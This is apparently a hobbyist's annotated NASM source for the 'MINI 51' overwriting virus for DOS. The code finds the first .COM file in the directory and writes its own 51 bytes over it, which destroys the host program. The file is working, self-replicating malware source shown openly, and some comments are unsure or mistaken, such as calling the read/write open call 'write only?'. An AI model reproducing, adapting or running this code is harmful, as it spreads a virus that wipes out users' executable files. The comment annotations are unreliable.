; MINI 51 overwriting virus
; nasm -fobj MINI-51.ASM -o MINI-51.COM

FNAME	EQU	009EH		; search-function file name result

ORG	100H

section	.text

START:
	mov	dx, FILESPEC	; had to remove "offset" for some
			     	; reason in freedos bc it was throwing errors :P
	mov	ah, 4EH		; search for *.COM (search first)
	int	21H
	jc	DONE

FIRST_FILE:
	mov	dx, FNAME	; pointer to ASCIIZ filespec
	mov	ax, 3D02H	; open file (write only?)
	int	21H		

	xchg	ax, bx		; write virus to file
	mov	dx, 0100H	; location of virus
	mov	cx, 0033H	; size of virus
	mov	ah, 40H		; ???
	int	21H

	mov	ah, 3EH		; close file
	int	21H

DONE:
	RET			; exit to DOS

section .data

FILESPEC:
	db	'*.COM'		; string for COM file search
	db	00